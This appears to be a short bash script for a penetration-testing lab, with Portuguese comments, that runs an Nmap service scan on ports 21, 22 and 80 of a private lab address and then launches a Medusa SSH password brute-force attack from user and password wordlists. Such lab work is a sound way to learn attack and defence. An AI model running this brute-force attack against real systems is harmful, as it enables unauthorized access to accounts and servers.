#!/bin/bash
# Automação do laboratório de Brute Force com Nmap e Medusa
TARGET="192.168.26.128"

echo "[+] Executando reconhecimento de serviços com Nmap em $TARGET..."
nmap -sV -p 21,22,80 $TARGET

echo "[+] Executando ataque Brute Force com Medusa (SSH)..."
medusa -h $TARGET -U users.txt -P passwords.txt -M ssh -f
